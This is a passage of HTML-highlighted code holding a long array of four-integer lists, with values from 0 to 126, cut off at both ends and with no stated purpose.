class="number">22</span>, <span class="number">115</span>, <span class="number">20</span>, <span class="number">67</span>], [<span class="number">40</span>, <span class="number">72</span>, <span class="number">110</span>, <span class="number">65</span>], [<span class="number">111</span>, <span class="number">92</span>, <span class="number">106</span>, <span class="number">117</span>], [<span class="number">5</span>, <span class="number">123</span>, <span class="number">21</span>, <span class="number">96</span>], [<span class="number">41</span>, <span class="number">14</span>, <span class="number">23</span>, <span class="number">114</span>], [<span class="number">113</span>, <span class="number">75</span>, <span class="number">43</span>, <span class="number">65</span>], [<span class="number">56</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">48</span>], [<span class="number">40</span>, <span class="number">101</span>, <span class="number">16</span>, <span class="number">114</span>], [<span class="number">42</span>, <span class="number">84</span>, <span class="number">95</span>, <span class="number">13</span>], [<span class="number">36</span>, <span class="number">110</span>, <span class="number">91</span>, <span class="number">107</span>], [<span class="number">4</span>, <span class="number">13</span>, <span class="number">60</span>, <span class="number">74</span>], [<span class="number">24</span>, <span class="number">80</span>, <span class="number">125</span>, <span class="number">76</span>], [<span class="number">123</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">119</span>], [<span class="number">31</span>, <span class="number">87</span>, <span class="number">6</span>, <span class="number">123</span>], [<span class="number">61</span>, <span class="number">106</span>, <span class="number">73</span>, <span class="number">120</span>], [<span class="number">66</span>, <span class="number">10</span>, <span class="number">36</span>, <span class="number">65</span>], [<span class="number">91</span>, <span class="number">38</span>, <span class="number">46</span>, <span class="number">9</span>], [<span class="number">121</span>, <span class="number">20</span>, <span class="number">106</span>, <span class="number">48</span>], [<span class="number">123</span>, <span class="number">21</span>, <span class="number">78</span>, <span class="number">27</span>], [<span class="number">22</span>, <span class="number">74</span>, <span class="number">55</span>, <span class="number">110</span>], [<span class="number">47</span>, <span class="number">49</span>, <span class="number">118</span>, <span class="number">76</span>], [<span class="number">30</span>, <span class="number">10</span>, <span class="number">16</span>, <span class="number">118</span>], [<span class="number">43</span>, <span class="number">19</span>, <span class="number">52</span>, <span class="number">61</span>], [<span class="number">100</span>, <span class="number">9</span>, <span class="number">37</span>, <span class="number">35</span>], [<span class="number">20</span>, <span class="number">102</span>, <span class="number">111</span>, <span class="number">94</span>], [<span class="number">116</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">43</span>], [<span class="number">13</span>, <span class="number">110</span>, <span class="number">42</span>, <span class="number">14</span>], [<span class="number">46</span>, <span class="number">65</span>, <span class="number">71</span>, <span class="number">28</span>], [<span class="number">82</span>, <span class="number">5</span>, <span class="number">76</span>, <span class="number">74</span>], [<span class="number">86</span>, <span class="number">34</span>, <span class="number">117</span>, <span class="number">84</span>], [<span class="number">28</span>, <span class="number">44</span>, <span class="number">82</span>, <span class="number">50</span>], [<span class="number">76</span>, <span class="number">79</span>, <span class="number">77</span>, <span class="number">11</span>], [<span class="number">68</span>, <span class="number">39</span>, <span class="number">51</span>, <span class="number">89</span>], [<span class="number">83</span>, <span class="number">93</span>, <span class="number">95</span>, <span class="number">2</span>], [<span class="number">54</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">82</span>], [<span class="number">99</span>, <span class="number">90</span>, <span class="number">122</span>, <span class="number">37</span>], [<span class="number">16</span>, <span class="number">92</span>, <span class="number">79</span>, <span class="number">12</span>], [<span class="number">67</span>, <span class="number">86</span>, <span class="number">24</span>, <span class="number">36</span>], [<span class="number">80</span>, <span class="number">94</span>, <span class="number">106</span>, <span class="number">59</span>], [<span class="number">50</span>, <span class="number">56</span>, <span class="number">95</span>, <span class="number">98</span>], [<span class="number">33</span>, <span class="number">68</span>, <span class="number">89</span>, <span class="number">40</span>], [<span class="number">74</span>, <span class="number">124</span>, <span class="number">14</span>, <span class="number">82</span>], [<span class="number">88</span>, <span class="number">93</span>, <span class="number">54</span>, <span class="number">93</span>], [<span class="number">51</span>, <span class="number">17</span>, <span class="number">124</span>, <span class="number">31</span>], [<span class="number">17</span>, <span class="number">17</span>, <span class="number">45</span>, <span class="number">35</span>], [<span class="number">113</span>, <span class="number">71</span>, <span class="number">76</span>, <span class="number">44</span>], [<span class="number">48</span>, <span class="number">6</span>, <span class="number">120</span>, <span class="number">4</span>], [<span class="number">36</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">11</span>], [<span class="number">2</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">72</span>], [<span class="number">42</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">81</span>], [<span class="number">73</span>, <span class="number">22</span>, <span class="number">79</span>, <span class="number">27</span>], [<span class="number">85</span>, <span class="number">35</span>, <span class="number">29</span>, <span class="number">98</span>], [<span class="number">76</span>, <span class="number">76</span>, <span class="number">37</span>, <span class="number">22</span>], [<span class="number">82</span>, <span class="number">29</span>, <span class="number">42</span>, <span class="number">27</span>], [<span class="number">75</span>, <span class="number">114</span>, <span class="number">37</span>, <span class="number">106</span>], [<span class="number">40</span>, <span class="number">69</span>, <span class="number">53</span>, <span class="number">73</span>], [<span class="number">39</span>, <span class="number">44</span>, <span class="number">33</span>, <span class="number">121</span>], [<span class="number">94</span>, <span class="number">85</span>, <span class="number">92</span>, <span class="number">54</span>], [<span class="number">91</span>, <span class="number">77</span>, <span class="number">124</span>, <span class="number">46</span>], [<span class="number">108</span>, <span class="number">31</span>, <span class="number">101</span>, <span class="number">84</span>], [<span class="number">35</span>, <span class="number">33</span>, <span class="number">97</span>, <span class="number">45</span>], [<span class="number">99</span>, <span class="number">32</span>, <span class="number">17</span>, <span class="number">14</span>], [<span class="number">1</span>, <span class="number">66</span>, <span class="number">11</span>, <span class="number">35</span>], [<span class="number">78</span>, <span class="number">100</span>, <span class="number">95</span>, <span class="number">81</span>], [<span class="number">73</span>, <span class="number">49</span>, <span class="number">14</span>, <span class="number">37</span>], [<span class="number">70</span>, <span class="number">9</span>, <span class="number">107</span>, <span class="number">2</span>], [<span class="number">84</span>, <span class="number">98</span>, <span class="number">92</span>, <span class="number">62</span>], [<span class="number">123</span>, <span class="number">87</span>, <span class="number">87</span>, <span class="number">110</span>], [<span class="number">3</span>, <span class="number">81</span>, <span class="number">111</span>, <span class="number">28</span>], [<span class="number">20</span>, <span class="number">2</span>, <span class="number">91</span>, <span class="number">37</span>], [<span class="number">93</span>, <span class="number">101</span>, <span class="number">77</span>, <span class="number">93</span>], [<span class="number">27</span>, <span class="number">16</span>, <span class="number">31</span>, <span class="number">105</span>], [<span class="number">95</span>, <span class="number">81</span>, <span class="number">87</span>, <span class="number">17</span>], [<span class="number">10</span>, <span class="number">103</span>, <span class="number">21</span>, <span class="number">102</span>], [<span class="number">81</span>, <span class="number">57</span>, <span class="number">118</span>, <span class="number">82</span>], [<span class="number">15</span>, <span class="number">92</span>, <span class="number">60</span>, <span class="number">71</span>], [<span class="number">16</span>, <span class="number">84</span>, <span class="number">126</span>, <span class="number">49</span>], [<span class="number">35</span>, <span class="number">26</span>, <span class="number">2</span>, <span class="number">120</span>], [<span class="number">70</span>, <span class="number">86</span>, <span class="number">45</span>, <span class="number">9</span>], [<span class="number">29</span>, <span class="number">8</span>, <span class="number">40</span>, <span class="number">66</span>], [<span class="number">99</span>, <span class="number">77</span>, <span class="number">14</span>, <span class="number">9</span>], [<span class="number">12</span>, <span class="number">70</span>, <span class="number">50</span>, <span class="number">52</span>], [<span class="number">21</span>, <span class="number">21</span>, <span class="number">85</span>, <span class="number">54</span>], [<span class="number">91</span>, <span class="number">94</span>, <span class="number">100</span>, <span class="number">85</span>], [<span class="number">9</span>, <span class="number">42</span>, <span class="number">47</span>, <span class="number">14</span>], [<span class="number">117</span>, <span class="number">55</span>, <span class="number">17</span>, <span class="number">99</span>], [<span class="number">53</span>, <span class="number">45</span>, <span class="number">4</span>, <span class="number">72</span>], [<span class="number">49</span>, <span class="number">10</span>, <span class="number">27</span>, <span class="number">121</span>], [<span class="number">108</span>, <span class="number">61</span>, <span class="number">73</span>, <span class="number">42</span>], [<span class="number">121</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">71</span>], [<span class="number">49</span>, <span class="number">63</span>, <span class="number">50</span>, <span class="number">117</span>], [<span class="number">5</span>, <span class="number">78</span>, <span class="number">24</span>, <span class="number">101</span>], [<span class="number">0</span>, <span class="number">117</span>, <span class="number">21</span>, <span class="number">46</span>], [<span class="number">90</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">32</span>], [<span class="number">74</span>, <span class="number">85</span>, <span class="number">118</span>, <span class="number">84</span>], [<span class="number">13</span>, <span class="number">73</span>, <span class="number">18</span>, <span class="number">66</span>], [<span class="number">95</span>, <span class="number">24</span>, <span class="number">120</span>, <span class="number">18</span>], [<span class="number">94</span>, <span class="number">21</span>, <span class="number">111</span>, <span class="number">34</span>], [<span class="number">66</span>, <span class="number">68</span>, <span class="number">80</span>, <span class="number">21</span>], [<span class="number">102</span>, <span class="number">49</span>, <span class="number">57</span>, <span class="number">55</span>], [<span class="number">25</span>, <span class="number">85</span>, <span class="number">107</span>, <span class="number">98</span>], [<span class="number">8</span>, <span class="number">18</span>, <span class="number">88</span>, <span class="number">12</span>], [<span class="number">18</span>, <span class="number">6</span>, <span class="number">86</span>, <span class="number">82</span>], [<span class="number">18</span>, <span class="number">91</span>, <span class="number">126</span>, <span class="number">115</span>], [<span class="number">26</span>, <span class="number">11</span>, <span class="number">30</span>, <span class="number">35</span>], [<span class="number">88</span>, <span class="number">78</span>, <span class="number">76</span>, <span class="number">74</span>], [<span class="number">51</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">15</span>], [<span class="number">60</span>, <span class="number">24</span>, <span class="number">72</span>, <span class="number">27</span>], [<span class="number">91</span>, <span class="number">72</span>, <span class="number">44</span>, <span class="number">104</span>], [<span class="number">84</span>, <span class="number">113</span>, <span class="number">39</span>, <span class="number">116</span>], [<span class="number">41</span>, <span class="number">83</span>, <span class="number">91</span>, <span class="number">74</span>], [<span class="number">84</span>, <span class="number">17</span>, <span class="number">94</span>, <span class="number">119</span>], [<span class="number">46</span>, <span class="number">95</span>, <span class="number">85</span>, <span class="number">5</span>], [<span class="number">109</span>, <span class="number">58</span>, <span class="number">71</span>, <span class="number">42</span>], [<span class="number">126</span>, <span class="number">29</span>, <span class="number">114</span>, <span class="number">73</span>], [<span class="number">27</span>, <span class="number">70</span>, <span class="number">7</span>, <span class="number">125</span>], [<span class="number">121</span>, <span class="number">66</span>, <span class="number">97</span>, <span class="number">111</span>], [<span class="number">8</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">57</span>], [<span class="number">15</span>, <span class="number">62</span>, <span class="number">65</span>, <span class="number">8</span>], [<span class="number">101</span>, <span class="number">79</span>, <span class="number">32</span>, <span class="number">74</span>], [<span class="number">69</span>, <span class="number">42</span>, <span class="number">38</span>, <span class="number">58</span>], [<span class="number">65</span>, <span class="number">81</span>, <span class="number">72</span>, <span class="number">16</span>], [<span class="number">20</span>, <span class="number">81</span>, <span class="number">1</span>, <span class="number">126</span>], [<span class="number">91</span>, <span class="number">111</span>, <span class="number">69</span>, <span class="number">33</span>], [<span class="number">56</span>, <span class="number">84</span>, <span class="number">65</span>, <span class="number">66</span>], [<span class="number">47</span>, <span class="number">78</span>, <span class="number">43</span>, <span class="number">100</span>], [<span class="number">43</span>, <span class="number">90</span>, <span class="number">80</span>, <span class="number">25</span>], [<span class="number">46</span>, <span class="number">55</span>, <span class="number">10</span>, <span class="number">60</span>], [<span class="number">116</span>, <span class="number">110</span>, <span class="number">49</span>, <span class="number">116</span>], [<span class="number">72</span>, <span class="number">115</span>, <span class="number">38</span>, <span class="number">104</span>], [<span class="number">79</span>, <span class="number">43</span>, <span class="number">74</span>, <span class="number">106</span>], [<span class="number">86</span>, <span class="number">113</span>, <span class="number">84</span>, <span class="number">76</span>], [<span class="number">102</span>, <span class="number">2</span>, <span class="number">119</span>, <span class="number">3</span>], [<span class="number">126</span>, <span class="number">25</span>, <span class="number">83</span>, <span class="number">44</span>], [<span class="number">37</span>, <span class="number">83</span>, <span class="number">46</span>, <span class="number">40</span>], [<span class="number">13</span>, <span class="number">75</span>, <span class="number">101</span>, <span class="number">101</span>], [<span class="number">76</span>, <span class="number">93</span>, <span class="number">3</span>, <span class="number">63</span>], [<span class="number">69</span>, <span class="number">9</span>, <span class="number">84</span>, <span class="number">37</span>], [<span class="number">103</span>, <span class="number">47</span>, <span class="number">106</span>, <span class="number">80</span>], [<span class="number">72</span>, <span class="number">104</span>, <span class="number">85</span>, <span class="number">19</span>], [<span class="number">124</span>, <span class="number">118</span>, <span class="number">34</span>, <span class="number">81</span>], [<span class="number">57</span>, <span class="number">25</span>, <span class="number">52</span>, <span class="number">119</span>], [<span class="number">44</span>, <span class="number">56</span>, <span class="number">63</span>, <span class="number">90</span>], [<span class="number">123</span>, <span class="number">46</span>, <span class="number">124</span>, <span class="number">31</span>], [<span class="number">19</span>, <span class="number">116</span>, <span class="number">23</span>, <span class="number">77</span>], [<span class="number">126</span>, <span class="number">78</span>, <span class="number">37</span>, <span class="number">93</span>], [<span class="number">34</span>, <span class="number">95</span>, <span class="number">43</span>, <span class="number">98</span>], [<span class="number">37</span>, <span class="number">90</span>, <span class="number">32</span>, <span class="number">97</span>], [<span class="number">106</span>, <span class="number">8</span>, <span class="number">80</span>, <span class="number">8</span>], [<span class="number">90</span>, <span class="number">5</span>, <span class="number">113</span>, <span class="number">68</span>], [<span class="number">99</span>, <span class="number">40</span>, <span class="number">39</span>, <span class="number">18</span>], [<span class="number">90</span>, <span class="number">37</span>, <span class="number">48</span>, <span class="number">45</span>], [<span class="number">56</span>, <span class="number">13</span>, <span class="number">76</span>, <span class="number">6</span>], [<span class="number">68</span>, <span class="number">33</span>, <span class="number">52</span>, <span class="number">102</span>], [<span class="number">62</span>, <span class="number">45</span>, <span class="number">29</span>, <span class="number">123</span>], [<span class="number">100</span>, <span class="number">21</span>, <span class="number">73</span>, <span class="number">92</span>], [<span class="number">92</span>, <span class="number">18</span>, <span class="number">118</span>, <span class="number">23</span>], [<span class="number">84</span>, <span class="number">86</span>, <span class="number">42</span>, <span class="number">83</span>], [<span class="number">107</span>, <span class="number">8</span>, <span class="number">71</span>, <span class="number">52</span>], [<span class="number">114</span>, <span class="number">106</span>, <span class="number">78</span>, <span class="number">85</span>], [<span class="number">10</span>, <span class="number">120</span>, <span class="number">115</span>, <span class="number">119</span>], [<span class="number">27</span>, <span class="number">49</span>, <span class="number">124</span>, <span class="number">16</span>], [<span class="number">65</span>, <span class="number">40</span>, <span class="number">48</span>, <span class="number">37</span>], [<span class="number">69</span>, <span class="number">42</span>, <span class="number">8</span>, <span class="number">29</span>], [<span class="number">35</span>, <span class="number">39</span>, <span class="number">55</span>, <span class="number">102</span>], [<span class="number">58</span>, <span class="number">19</span>, <span class="number">41</span>, <span class="number">75</span>], [<span class="number">17</span>, <span class="number">2</span>, <span class="number">113</span>, <span class="number">12</span>], [<span class="number">8</span>, <span class="number">34</span>, <span class="number">72</span>, <span class="number">75</span>], [<span class="number">91</span>, <span class="number">32</span>, <span class="number">19</span>, <span class="number">52</span>], [<span class="number">62</span>, <span class="number">50</span>, <span class="number">109</span>, <span class="number">78</span>], [<span class="number">9</span>, <span class="number">115</span>, <span class="number">35</span>, <span class="number">50</span>], [<span class="number">42</span>, <span class="number">83</span>, <span class="number">78</span>, <span class="number">41</span>], [<span class="number">34</span>, <span class="number">94</span>, <span class="number">97</span>, <span class="number">58</span>], [<span class="number">56</span>, <span class="number">73</span>, <span class="number">25</span>, <span class="number">115</span>], [<span class="number">55</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">86</span>], [<span class="number">97</span>, <span class="number">95</span>, <span class="number">30</span>, <span class="number">92</span>], [<span class="number">47</span>, <span class="number">105</span>, <span class="number">70</span>, <span class="number">68</span>], [<span class="number">50</span>, <span class="number">18</span>, <span class="number">51</span>, <span class="number">23</span>], [<span class="number">46</span>, <span class="number">57</span>, <span class="number">80</span>, <span class="number">29</span>], [<span class="number">4</span>, <span class="number">66</span>, <span class="number">123</span>, <span class="number">24</span>], [<span class="number">55</span>, <span class="number">53</span>, <span class="number">26</span>, <span class="number">36</span>], [<span class="number">71</span>, <span class="number">59</span>, <span class="number">104</span>, <span class="number">91</span>], [<span class="number">94</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">34</span>], [<span class="number">57</span>, <span class="number">8</span>, <span class="number">85</span>, <span class="number">102</span>], [<span class="number">89</span>, <span class="number">73</span>, <span class="number">115</span>, <span class="number">25</span>], [<span class="number">13</span>, <span class="number">38</span>, <span class="number">81</span>, <span class="number">76</span>], [<span class="number">104</span>, <span class="number">30</span>, <span class="number">81</span>, <span class="number">104</span>], [<span class="number">55</span>, <span class="number">101</span>, <span class="number">95</span>, <span class="number">101</span>], [<span class="number">69</span>, <span class="number">65</span>, <span class="number">5</span>, <span class="number">11</span>], [<span class="number">123</span>, <span class="number">105</span>, <span class="number">84</span>, <span class="number">125</span>], [<span class="number">38</span>, <span class="number">110</span>, <span class="number">4</span>, <span class="number">28</span>], [<span class="number">112</span>, <span class="number">115</span>, <span class="number">92</span>, <span class="number">71</span>], [<span class="number">90</span>, <span class="number">120</span>, <span class="number">112</span>, <span class="number">39</span>], [<span class="number">50</span>, <span class="number">18</span>, <span class="number">107</span>, <span class="number">71</span>], [<span class="number">95</span>, <span class="number">63</span>, <span class="number">118</span>, <span class="number">93</span>], [<span class="number">93</span>, <span class="number">111</span>, <span class="number">59</span>, <span class="number">55</span>], [<span class="number">17</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">88</span>], [<span class="number">78</span>, <span class="number">126</span>, <span class="number">37</span>, <span class="number">12</span>], [<span class="number">56</span>, <span class="number">112</span>, <span class="number">53</span>, <span class="number">12</span>], [<span class="number">65</span>, <span class="number">34</span>, <span class="number">82</span>, <span class="number">100</span>], [<span class="number">9</span>, <span class="number">94</span>, <span class="number">72</span>, <span class="number">99</span>], [<span class="number">78</span>, <span class="number">76</span>, <span class="number">43</span>, <span class="number">91</span>], [<span class="number">7</span>, <span class="number">88</span>, <span class="number">107</span>, <span class="number">31</span>], [<span class="number">43</span>, <span class="number">91</span>, <span class="number">97</span>, <span class="number">4</span>], [<span class="number">113</span>, <span class="number">112</span>, <span class="number">36</span>, <span class="number">15</span>], [<span class="number">8</span>, <span class="number">97</span>, <span class="number">23</span>, <span class="number">84</span>], [<span class="number">65</span>, <span class="number">92</span>, <span class="number">31</span>, <span class="number">63</span>], [<span class="number">54</span>, <span class="number">38</span>, <span class="number">119</span>, <span class="number">103</span>], [<span class="number">89</span>, <span class="number">50</span>, <span class="number">57</span>, <span class="number">50</span>], [<span class="number">61</span>, <span class="number">37</span>, <span class="number">87</span>, <span class="number">0</span>], [<span class="number">21</span>, <span class="number">35</span>, <span class="number">44</span>, <span class="number">22</span>], [<span class="number">20</span>, <span class="number">32</span>, <span class="number">95</span>, <span class="number">116</span>], [<span class="number">10</span>, <span class="number">94</span>, <span class="number">103</span>, <span class="number">84</span>], [<span class="number">59</span>, <span class="number">29</span>, <span class="number">7</span>, <span class="number">50</span>], [<span class="number">98</span>, <span class="number">33</span>, <span class="number">87</span>, <span class="number">33</span>], [<span class="number">7</span>, <span class="number">96</span>, <span class="number">36</span>, <span class="number">67</span>], [<span class="number">85</span>, <span class="number">10</span>, <span class="number">35</span>, <span class="number">98</span>], [<span class="number">65</span>, <span class="number">49</span>, <span class="number">19</span>, <span class="number">62</span>], [<span class="number">56</span>, <span class="number">67</span>, <span class="number">14</span>, <span class="number">91</span>], [<span class="number">30</span>, <span class="number">49</span>, <span class="number">111</span>, <span class="number">77</span>], [<span class="number">121</span>, <span class="number">49</span>, <span class="number">108</span>, <span class="number">119</span>], [<span class="number">89</span>, <span class="number">67</span>, <span class="number">115</span>, <span class="number">69</span>], [<span class="number">65</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">82</span>], [<span class="number">117</span>, <span class="number">57</span>, <span class="number">117</span>, <span class="number">23</span>], [<span class="number">23</span>, <span class="number">38</span>, <span class="number">2</span>, <span class="number">98</span>], [<span class="number">60</span>, <span class="number">28</span>, <span class="number">94</span>, <span class="number">93</span>], [<span class="number">23</span>, <span class="number">65</span>, <span class="number">8</span>, <span class="number">114</span>], [<span class="number">121</span>, <span class="number">105</span>, <span class="number">122</span>, <span class="number">40</span>], [<span class="number">120</span>, <span class="number">12</span>, <span class="number">21</span>, <span class="number">112</span>], [<span class="number">55</span>, <span class="number">51</span>, <span class="number">2</span>, <span class="number">77</span>], [<span class="number">48</span>, <span class="number">41</span>, <span class="number">113</span>, <span class="number">62</span>], [<span class="number">66</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">119</span>], [<span class="number">4</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">21</span>], [<span class="number">41</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">80</span>], [<span class="number">23</span>, <span class="number">61</span>, <span class="number">106</span>, <span class="number">16</span>], [<span class="number">23</span>, <span class="number">53</span>, <span class="number">122</span>, <span class="number">68</span>], [<span class="number">6</span>, <span class="number">54</span>, <span class="number">5</span>, <span class="number">101</span>], [<span class="number">69</span>, <span class="number">49</span>, <span class="number">7</span>, <span class="number">79</span>], [<span class="number">17</span>, <span class="number">70</span>, <span class="number">64</span>, <span class="number">88</span>], [<span class="number">103</span>, <span class="number">30</span>, <span class="number">76</span>, <span class="number">31</span>], [<span class="number">108</span>, <span class="number">82</span>, <span class="number">90</span>, <span class="number">109</span>], [<span class="number">55</span>, <span class="number">56</span>, <span class="number">113</span>, <span class="number">37</span>], [<span class="number">93</span>, <span class="number">99</span>, <span class="number">126</span>, <span class="number">44</span>], [<span class="number">1</span>, <span class="number">46</span>, <span class="number">105</span>, <span class="number">124</span>], [<span class="number">55</span>, <span class="number">54</span>, <span class="number">35</span>, <span class="number">115</span>], [<span class="number">0</span>, <span class="number">89</span>, <span class="number">53</span>, <span class="number">97</span>], [<span class="number">67</span>, <span class="number">111</span>, <span class="number">107</span>, <span class="number">80</span>], [<span class="number">92</span>, <span class="number">122</span>, <span class="number">40</span>, <span class="number">64</span>], [<span class="number">75</span>, <span class="number">2</span>, <span class="number">126</span>, <span class="number">118</span>], [<span class="number">90</span>, <span class="number">84</span>, <span class="number">43</span>, <span class="number">74</span>], [<span class="number">101</span>, <span class="number">69</span>, <span class="number">60</span>, <span class="number">17</span>], [<span class="number">104</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">122</span>], [<span class="number">94</span>, <span class="number">4</span>, <span class="number">115</span>, <span class="number">91</span>], [<span class="number">15</span>, <span class="number">11</span>, <span class="number">111</span>, <span class="number">105</span>], [<span class="number">9</span>, <span class="number">7</span>, <span class="number">32</span>, <span class="number">101</span>], [<span class="number">77</span>, <span class="number">18</span>, <span class="number">55</span>, <span class="number">56</span>], [<span class="number">66</span>, <span class="number">7</span>, <span class="number">117</span>, <span class="number">108</span>], [<span class="number">116</span>, <span class="number">121</span>, <span class="number">33</span>, <span class="number">66</span>], [<span class="number">32</span>, <span class="number">41</span>, <span class="number">83</span>, <span class="number">125</span>], [<span class="number">60</span>, <span class="number">52</span>, <span class="number">70</span>, <span class="number">58</span>], [<span class="number">125</span>, <span class="number">54</span>, <span class="number">93</span>, <span class="number">15</span>], [<span class="number">70</span>, <span class="number">19</span>, <span class="number">10</span>, <span class="number">58</span>], [<span class="number">83</span>, <span class="number">94</span>, <span class="number">61</span>, <span class="number">126</span>], [<span class="number">95</span>, <span class="number">85</span>, <span class="number">80</span>, <span class="number">44</span>], [<span class="number">25</span>, <span class="number">89</span>, <span class="number">117</span>, <span class="number">74</span>], [<span class="number">12</span>, <span class="number">17</span>, <span class="number">63</span>, <span class="number">87</span>], [<span class="number">118</span>, <span class="number">80</span>, <span class="number">96</span>, <span class="number">26</span>], [<span class="number">6</span>, <span class="number">97</span>, <span class="number">79</span>, <span class="number">38</span>], [<span class="number">97</span>, <span class="number">3</span>, <span class="number">107</span>, <span class="number">95</span>], [<span class="number">7</span>, <span class="number">82</span>, <span class="number">106</span>, <span class="number">92</span>], [<span class="number">83</span>, <span class="number">100</span>, <span class="number">119</span>, <span class="number">95</span>], [<span class="number">81</span>, <span class="number">26</span>, <span class="number">99</span>, <span class="number">56</span>], [<span class="number">25</span>, <span class="number">60</span>, <span class="number">51</span>, <span class="number">122</span>], [<span class="number">56</span>, <span class="number">18</span>, <span class="number">22</span>, <span class="number">84</span>], [<span class="number">9</span>, <span class="number">72</span>, <span class="number">107</span>, <span class="number">114</span>], [<span class="number">80</span>, <span class="number">97</span>, <span class="number">92</span>, <span class="number">52</span>], [<span class="number">108</span>, <span class="number">47</span>, <span class="number">58</span>, <span class="number">46</span>], [<span class="number">9</span>, <span class="number">47</span>, <span class="number">7</span>, <span class="number">47</span>], [<span class="number">115</span>, <span class="number">68</span>, <span class="number">91</span>, <span class="number">7</span>], [<span class="number">14</span>, <span class="number">120</span>, <span class="number">87</span>, <span class="number">122</span>], [<span class="number">97</span>, <span class="number">15</span>, <span class="number">40</span>, <span class="number">79</span>], [<span class="number">5</span>, <span class="number">92</span>, <span class="number">85</span>, <span class="number">93</span>], [<span class="number">4</span>, <span class="number">97</span>, <span class="number">73</span>, <span class="number">63</span>], [<span class="number">25</span>, <span class="number">22</span>, <span class="number">92</span>, <span class="number">108</span>], [<span class="number">88</span>, <span class="number">4</span>, <span class="number">34</span>, <span class="number">86</span>], [<span class="number">0</span>, <span class="number">43</span>, <span class="number">21</span>, <span class="number">57</span>], [<span class="number">67</span>, <span class="number">90</span>, <span class="number">36</span>, <span class="number">50</span>], [<span class="number">15</span>, <span class="number">126</span>, <span class="number">37</span>, <span class="number">12</span>], [<span class="number">92</span>, <span class="number">73</span>, <span class="number">96</span>, <span class="number">71</span>], [<span class="number">76</span>, <span class="number">107</span>, <span class="number">27</span>, <span class="number">115</span>], [<span class="number">79</span>, <span class="number">8</span>, <span class="number">68</span>, <span class="number">55</span>], [<span class="number">38</span>, <span class="number">12</span>, <span class="number">120</span>, <span class="number">126</span>], [<span class="number">54</span>, <span class="number">46</span>, <span class="number">7</span>, <span class="number">69</span>], [<span class="number">72</span>, <span class="number">114</span>, <span class="number">93</span>, <span class="number">60</span>], [<span class="number">59</span>, <span class="number">98</span>, <span class="number">27</span>, <span class="number">102</span>], [<span class="number">50</span>, <span class="number">76</span>, <span class="number">87</span>, <span class="number">19</span>], [<span class="number">77</span>, <span class="number">107</span>, <span class="number">29</span>, <span class="number">40</span>], [<span class="number">36</span>, <span class="number">73</span>, <span class="number">21</span>, <span class="number">123</span>], [<span class="number">36</span>, <span class="number">89</span>, <span class="number">82</span>, <span class="number">74</span>], [<span class="number">24</span>, <span class="number">73</span>, <span class="number">118</span>, <span class="number">86</span>], [<span class="number">58</span>, <span class="number">89</span>, <span class="number">115</span>, <span class="number">106</span>], [<span class="number">12</span>, <span class="number">27</span>, <span class="number">33</span>, <span class="number">72</span>], [<span class="number">28</span>, <span class="number">94</span>, <span class="number">21</span>, <span class="number">26</span>], [<span class="number">0</span>, <span class="number">79</span>, <span class="number">48</span>, <span class="number">110</span>], [<span class="number">72</span>, <span class="number">62</span>, <span class="number">82</span>, <span class="number">57</span>], [<span class="number">65</span>, <span class="number">84</span>, <span class="number">114</span>, <span class="number">97</span>], [<span class="number">80</span>, <span class="number">68</span>, <span class="number">52</span>, <span class="number">52</span>], [<span class="number">119</span>, <span class="number">35</span>, <span class="number">103</span>, <span class="number">101</span>], [<span class="number">10</span>, <span class="number">67</span>, <span class="number">68</span>, <span class="number">69</span>], [<span class="number">101</span>, <span class="number">17</span>, <span class="number">54</span>, <span class="number">40</span>], [<span class="number">98</span>, <span class="number">46</span>, <span class="number">21</span>, <span class="number">42</span>], [<span class="number">30</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">118</span>], [<span class="number">27</span>, <span class="number">33</span>, <span class="number">77</span>, <span class="number">114</span>], [<span class="number">66</span>, <span class="number">74</span>, <span class="number">61</span>, <span class="number">63</span>], [<span class="number">23</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">47</span>], [<span class="number">88</span>, <span class="number">30</span>, <span class="number">122</span>, <span class="number">119</span>], [<span class="number">15</span>, <span class="number">58</span>, <span class="number">55</span>, <span class="number">52</span>], [<span class="number">56</span>, <span class="number">27</span>, <span class="number">47</span>, <span class="number">45</span>], [<span class="number">119</span>, <span class="number">95</span>, <span class="number">59</span>, <span class="number">14</span>], [<span class="number">84</span>, <span class="number">69</span>, <span class="number">5</span>, <span class="number">83</span>], [<span class="number">21</span>, <span class="number">35</span>, <span class="number">39</span>, <span class="number">36</span>], [<span class="number">10</span>, <span class="number">92</span>, <span class="number">68</span>, <span class="number">17</span>], [<span class="number">79</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">38</span>], [<span class="number">36</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">117</span>], [<span class="number">117</span>, <span class="number">30</span>, <span class="number">5</span>, <span class="number">7</span>], [<span class="number">112</span>, <span class="number">15</span>, <span class="number">115</span>, <span class="number">123</span>], [<span class="number">54</span>, <span class="number">47</span>, <span class="number">18</span>, <span class="number">93</span>], [<span class="number">102</span>, <span class="number">111</span>, <span class="number">3</span>, <span class="number">68</span>], [<span class="number">91</span>, <span class="number">91</span>, <span class="number">5</span>, <span class="number">44</span>], [<span class="number">123</span>, <span class="number">118</span>, <span class="number">57</span>, <span class="number">32</span>], [<span class="number">12</span>, <span class="number">121</span>, <span class="number">31</span>, <span class="number">103</span>], [<span class="number">114</span>, <span class="number">52</span>, <span class="number">105</span>, <span class="number">12</span>], [<span class="number">100</span>, <span class="number">28</span>, <span class="number">117</span>, <span class="number">102</span>], [<span class="number">51</span>, <span 